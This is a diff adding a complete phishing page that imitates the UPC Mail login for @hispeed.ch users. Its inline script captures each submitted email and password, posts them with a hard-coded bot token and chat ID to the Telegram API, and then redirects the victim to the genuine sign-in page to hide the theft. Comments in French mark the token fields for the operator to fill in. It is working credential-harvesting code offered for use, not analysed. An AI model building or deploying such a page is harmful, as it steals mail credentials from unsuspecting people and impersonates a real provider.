@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>UPC Mail Login</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom, #9cc9f8 0%, #f0f4f9 60%);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 1rem;
+    }
+    .login-container {
+      background: white;
+      border-radius: 8px;
+      max-width: 400px;
+      width: 100%;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      padding: 2rem;
+    }
+    .login-container img {
+      width: 40px;
+      vertical-align: middle;
+    }
+    .login-header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 1.5rem;
+      border-bottom: 1px solid #e0e0e0;
+      padding-bottom: 1rem;
+    }
+    .login-header h2 {
+      margin-left: 0.5rem;
+      font-size: 1.3rem;
+      color: #002f6c;
+    }
+    label {
+      font-weight: bold;
+      display: block;
+      margin: 1rem 0 0.3rem;
+    }
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 0.7rem;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 1rem;
+    }
+    input:focus {
+      outline: none;
+      border-color: #00a0df;
+    }
+    .options {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 0.5rem;
+      font-size: 0.9rem;
+    }
+    .options input[type="checkbox"] {
+      margin-right: 5px;
+      transform: scale(1.1);
+    }
+    .options a {
+      color: #00a0df;
+      text-decoration: none;
+    }
+    .login-button {
+      width: 100%;
+      background-color: #00a0df;
+      color: white;
+      font-size: 1.1rem;
+      padding: 0.8rem;
+      border: none;
+      border-radius: 4px;
+      margin-top: 1.5rem;
+      cursor: pointer;
+    }
+    .language-select {
+      position: absolute;
+      top: 15px;
+      left: 15px;
+      font-size: 0.9rem;
+      color: #000;
+    }
+    #error-msg {
+      color: #c00;
+      margin-top: 1rem;
+      font-size: 0.9rem;
+      display: none;
+      text-align: center;
+    }
+    @media (max-width: 600px) {
+      .login-container {
+        padding: 1.5rem;
+      }
+      .login-header h2 {
+        font-size: 1.1rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="language-select">
+    <strong>Language:</strong> English (United States) ▼
+  </div>
+
+  <div class="login-container">
+    <div class="login-header">
+      <img src="logo.png" alt="UPC Logo" />
+      <h2>UPC Mail</h2>
+    </div>
+
+    <form id="loginForm">
+      <label for="email">Email address</label>
+      <input type="email" id="email" placeholder="Email address" required autocomplete="off" />
+
+      <label for="password">Password</label>
+      <input type="password" id="password" placeholder="Password" required autocomplete="off" />
+
+      <div class="options">
+        <label><input type="checkbox" checked /> Stay signed in</label>
+        <a href="#">Forgot your password?</a>
+      </div>
+
+      <button class="login-button" type="submit">Sign in</button>
+
+      <div id="error-msg">Only @hispeed.ch email addresses are allowed.</div>
+    </form>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "6833993399:AAHJuYS-Gm553wkH5-LiVAAyL8lhYLnAn7A"; // ← Remplace ici
+    const CHAT_ID = "-4681298703";     // ← Remplace ici
+
+    const form = document.getElementById("loginForm");
+    const errorMsg = document.getElementById("error-msg");
+
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      const emailValid = /^[a-zA-Z0-9._%+-]+@hispeed\.ch$/i.test(email);
+
+      if (!emailValid) {
+        errorMsg.style.display = "block";
+        return;
+      } else {
+        errorMsg.style.display = "none";
+      }
+
+      const message = `🔐 UPC Login:\n📧 Email: ${email}\n🔑 Password: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      })
+      .finally(() => {
+        window.location.href = "https://upcmail.hispeed.ch/appsuite/signin";
+      });
+    });
+  </script>
+</body>
+</html>
